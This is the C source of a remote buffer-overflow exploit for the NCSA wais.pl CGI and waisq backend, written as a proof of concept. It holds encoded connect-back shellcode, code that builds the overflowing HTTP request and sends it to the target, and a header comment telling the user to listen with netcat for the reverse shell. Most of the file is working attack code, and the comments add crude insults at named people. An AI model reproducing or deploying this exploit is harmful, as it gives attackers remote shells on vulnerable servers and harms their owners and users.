/*
   OnWaisKlote.c - NCSA wais.pl + waisq remote overflow - by Scrippie

   This program is meant as a PoC exploit - I don't think anyone will
   go and find a Linux machine running the wais.pl CGI and the waisq
   backend client at the same time.
   However, there are enough SunOS@Sparcs out there which do.

   Thanx to dvorak for pointing out this smash after I located the formatting
   problem in wais.pl

   The shellcode makes a connetion to the given IP and spawns a shell on port
   27002. It's recommended to have a listening netcat ready on this port.
   Ie. do a "nc -l -p 27002" on your machine, and run the exploit on the target
   If everything works out, it'll connect and spawn a shell.

   Shouts go out to:
        sk8, JimJones, ragnarok, f0bic, dvorak, guidob, dethy, dugo,
        ratcorpse, futant, and everyone on #!/bin/zsh I haven't mentioned
        mixter, Lamagra, prizm-, slash, cruci, {}, and all ex-b0f people
        #hit2000, #phreak.nl, #linuxasm and of course Synnergy.net

   Big fuck to:
        #hax - Skill will never make up for arrogance and basic unfriendliness
        flyahh - For being the biggest script-kid I know

   Love to:
        Maja (I can't explain how happy I am now you're coming to the
              Netherlands)
        Hester (you're my dearest friend)

   -- Scrippie/ronald@grafix.nl
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#define FORBIDDEN "\x00\x09\x0b\x0c\r\n{};<>\\^()*[]$`&#~|\""
#define SZ_SOURCEBUF 256
#define SZ_FILEBUF 256
#define RETADDY 0xbffff910      /* Works on my cute `lil box */

int wwwconnect(unsigned long ip);
int ICinInt(long, char *, size_t);
char *buildOverflow(unsigned long, unsigned int);
void *xmalloc(size_t);

/*
   Shellcode written by: Scrippie :)

   Smegma v0.5 ridded this shellcode of the following characters:
      "\x00\x09\x0b\x0c\r\n{};<>\\^()*[]$`&#~|\""

   For this purpose a xor mask of 0x92011e11 was brute forced
*/

char hellcode[] =
"\xeb\x14\x58\x89\xc6\x31\xc9\xb1\x25\x81\x36\x11\x1e\x01\x92\x83\xc6\x04\xe2"
"\xf5\xeb\x05\xe8\xe7\xff\xff\xff\xfa\x64\x5f\xa3\xd1\x2f\xda\xa3\xc3\xae\x67"
"\x21\x10\x93\x4f\x8e\xa3\x1f\x88\xc4\x31\xac\x07\x1b\x47\x3a\xb3\x90\x98\x48"
"\x1d\x5f\x91\x97\x47\x8a\x98\x08\x67\x55\x57\x1c\x68\xe8\x98\x58\x1d\x1f\x17"
"\x97\x47\xb2\x91\xdc\x0f\x1b\x47\x3a\x30\x52\x15\x78\x81\x51\x13\x93\x4f\x8e"
"\xdc\x9e\x30\x52\x15\x21\x88\x50\x9a\x40\x19\xa3\xd8\xd3\x81\x1b\xc1\x5f\xcc"
"\x12\x98\xce\x40\x5f\x91\x2f\xc1\x1f\x6f\x11\x81\x53\x16\xed\xab\x96\x1a\x93"
"\x5f\x9a\x98\x40\x11\x1f\x5f\x0e\x30\x40\xdc\x9e\x30\x52\xef\xde\xcc\x12\xf9"
"\x9f\xfe\x6d\xee\x5f\x40\xd0\x53\xAA\xAA\xAA\xAA\x31\x63\xfb\x7f\x31\x72\xfa";

/* The IP address to connect to is gonna be at 0xAAAAAAAA */
/* Make sure it's encoded just as the shellcode is */

int main(int argc, char **argv)
{
   char *iploc, *evilcode;
   int sd, align=0;
   unsigned long sip;                   /* IP to connect back to */
   unsigned long dip;                   /* Target IP */
   unsigned long retaddy=RETADDY;       /* Default return address */

   /* Whee, print the banner */

   if(argc < 3) {
      printf("OnWais Klote - Scrippie/Synnergy Networks\n");
      printf("Use as: %s <target> <IP to connect back to> [ret addy] [align]\n",
         argv[0]);
      exit(0);
   }

   printf("******************************************************\n");
   printf("+        OnWais Klote - Scrippie/Synnergy.net        +\n");
   printf("******************************************************\n");

   /* I know inet_addr() is obsolete - too bad, you can't run this
      program when you're on 255.255.255.255 - who is anyway? */

   if((dip = inet_addr(argv[1])) == -1) {
      printf("Error: Non valid IP address specified\n");
      exit(-1);
   }

   if((sip = inet_addr(argv[2])) == -1) {
      printf("Error: Non valid IP address specified\n");
      exit(-1);
   }

   /* Use specified return address */
   if(argc > 3) {
      retaddy = strtoul(argv[3], NULL, 16);
   }
   printf("Return address : 0x%lx\n", retaddy);

   /* Use specified alignment */
   if(argc > 4) {
      align = atoi(argv[4]);
   }
   printf("Alignment      : %d\n", align);
   printf("Target         : %s\n\n", argv[1]);

   /* We convert our IP to fit in the payload */
   /* Think of this as a strange value? Think of the shellcode alignment */
   sip ^= 0x1192011e;

   /* Check if the given RETADDY won't ruin our payload */
   if(ICinInt(retaddy, FORBIDDEN, sizeof(FORBIDDEN)-1)) {
      printf("Error: Found illegal character in return address\n");
      exit(0);
   }
   /* Check if the given IP won't ruin our shellcode */
   if(ICinInt(sip, FORBIDDEN, sizeof(FORBIDDEN)-1)) {
      printf("Error: Found illegal character in IP address\n");
      exit(0);
   }

   /* Locate the IP position in the shellcode */
   iploc=(char *)strchr(hellcode, 0xAA);
   memcpy((void *) iploc, (void *) &sip, 4);

   evilcode = buildOverflow(retaddy, align);

   sd = wwwconnect(dip);
   printf("Connected to %s\n", argv[1]);
   printf("Proceeding to send evil code...\n");
   send(sd, evilcode, strlen(evilcode), 0);
   printf("Sent!\n");

   return(0);
}

char *buildOverflow(unsigned long retaddy, unsigned int align)
{
   char source[SZ_SOURCEBUF];
   char *smash, *output;
   int c;

   smash = (char *)xmalloc(SZ_FILEBUF+align+1);
   output = (char *)xmalloc(SZ_SOURCEBUF+SZ_FILEBUF+align+1);

   for(c=0;c<SZ_SOURCEBUF-2;c++) source[c] = 0x90;

   source[253] = 0xeb;  /* Jump over few bytes between arrays on stack */
   source[254] = 0x08;
   source[255] = 0x00;

/*
   Directory and Sourcename follow each other on stack closely
   There are a few arbitrary bytes between them, therefore we
   jump over them with 0xeb 0x08 and land somewhere in the given NOPS
*/

   memset(smash, 0x90, 7+align);
                           /* Few nops on the stack - waisq ruins some bytes */
   smash[7+align] = 0xeb;  /* Jump over the EIP that we overflow */
   smash[8+align] = 0x04;  /* It's 4 bytes big */

   /* Return address gets choked in here */

   memcpy(smash+9+align, &retaddy, 4);
   smash[13+align] = 0x00;              /* strcat() needs the delimiter :) */

   strcat(smash, hellcode);             /* Copy the shellcode */

   sprintf(output, "GET /cgi-bin/wais.pl?-s+%s+-t+%s HTTP/1.0\n\n",
      source, smash);   /* Stuff it all on the heap */

   free(smash);
   return(output);      /* And return the pointer there */
}

/*
   Connects to a webserver
   "ip" is expected to be in network byte order
*/

int wwwconnect(unsigned long ip)
{
   struct sockaddr_in sa;       /* Sockaddr */
   int sd;                      /* Socket Descriptor */

   if((sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) {
      perror("socket()");
      exit(-1);
   }

   memset(&sa, 0x00, sizeof(struct sockaddr_in));
   sa.sin_port=htons(80);
   sa.sin_addr.s_addr=ip;

   if(connect(sd, &sa, sizeof(struct sockaddr_in)) == -1) {
      perror("connect()");
      exit(-1);
   }

   return(sd);
}
/*
   This function checks for illegal bytes in "long" types
*/

int ICinInt(long s, char *forbidden, size_t fsize)
{
   int i,j;

   for(i=0;i<fsize;i++) {
      for(j=0;j<sizeof(long);j++) {
         if((char)(s >> j*8) == forbidden[i]) return(1);
      }
   }
   return(0);
}

/*
   Wrapper for malloc() that does error checking
*/

void *xmalloc(size_t size)
{
   void *blah;

   if((blah = malloc(size)) == NULL) {
      perror("malloc()");
      exit(-1);
   }
   return(blah);
}
